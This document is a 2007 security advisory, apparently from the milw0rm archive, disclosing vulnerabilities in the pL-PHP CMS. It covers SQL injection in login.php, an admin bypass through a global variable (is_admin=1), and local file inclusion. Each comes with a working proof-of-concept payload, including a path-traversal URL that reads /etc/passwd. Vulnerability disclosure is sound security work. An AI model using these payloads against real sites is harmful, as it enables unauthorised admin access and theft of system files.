@@ -1,0 +1,109 @@
+   .      .        .  
+._ | _.  .|_  _. _.;_/
+[_)|(_]\_|[ )(_](_.| \.net
+|      ._|            
+"pL-PHP beta 0.9 - MULTIPLE VULNERABILITIES"
+	by Omni
+
+1) Infos
+---------
+Date            : 2007-04-10
+Product         : pL-PHP
+Version         : beta 0.9 - Prior version maybe also be affected
+Vendor          : http://sourceforge.net/projects/pl-php/ - http://www.karlcore.com/programming/blog/
+Vendor Status   : 2007-04-10 -> Not Informed!
+
+Description     : pL-PHP is a new PHP Portal or Content Management System (CMS). It is based on a "multi-topics" system,                      
+		  with sub-topics, and all the content (downloads, articles, headers, links...) is shared into these topics                   
+		  and sub-topics. It will be very easy to use.
+
+Source          : omnipresent - omni
+E-mail          : omnipresent[at]email[dot]it - omni[at]playhack[dot]net
+Team            : Playhack.net Security
+
+2) Security Issues
+-------------------
+--- [ SQL Injection - Admin Access Bypass ] ---
+===============================================
+
+[login.php Source Code Bugged - Line 10 - 20]
+
+require("includes/config.php");
+
+// Authentification
+// Script inspiré par DBprotect 1.0 de David Borrat (david@borrat.net)
+if (isset($_POST['login'])) {
+	$login = $_POST['login'];
+	$pass = md5($_POST['pass']);
+	
+$sql = mysql_connect($global['sql_host'], $global['sql_user'], $global['sql_pass']);
+mysql_select_db($global['sql_base'], $sql);
+$verif_query = sprintf("SELECT * FROM " . $global['prefix'] . "_users WHERE username='$login' AND user_password='$pass'");
+
+[end login.php Source Code]
+
+As we can see the variables $login and $pass are not properly sanitized before being used; so is possibile to exploit this vulnerability remotely.
+
+[ PoC ]
+=======
+
+Just run with your browser to login.php and insert in the login field: 1' OR '1' = '1' # and in the pass filed what you want! Now you have Admin credential!
+
+--- [Global Variable problem - Admin Access Bypass ] ---
+========================================================
+
+[admin.php Source Code Bugged - Line 14]
+
+[...]
+
+if($is_admin == 1)
+
+[...]
+
+[end admin.php Source Code]
+
+As we can se, via the browser we can just connect to admin.php script and pass the variable isadmin the number 1 :D.
+
+[ PoC ]
+=======
+
+http://remote_host/[remote_path]/admin.php?is_admin=1
+
+Now you are Admin ;)
+
+--- [Local File Inclusion ] ---
+===============================
+
+[admin.php Source Code Bugged - Line 16]
+
+[...]
+
+include("admin/lang/" . $lang . ".inc.php");
+
+[...]
+
+[end admin.php Source Code]
+
+As we can se, via the browser we can just connect to admin.php script and pass the variable $lang a pretty good path ;).
+
+[ PoC ]
+=======
+
+Connect with Admin Credential and... Have fun..
+
+eg 1:
+
+http://127.0.0.1/files/admin.php?is_admin=1&lang=../../../../../../etc/passwd%00
+
+eg 2:
+
+First you must.. log in as Admin (SQL Injection Method) and then...
+
+http://127.0.0.1/files/admin.php?&lang=../../../../../../etc/passwd%00
+
+3) Patches
+-----------
+
+Edit the source code to ensure that the input will be properly sanitized before being used
+
+# milw0rm.com [2007-04-10]
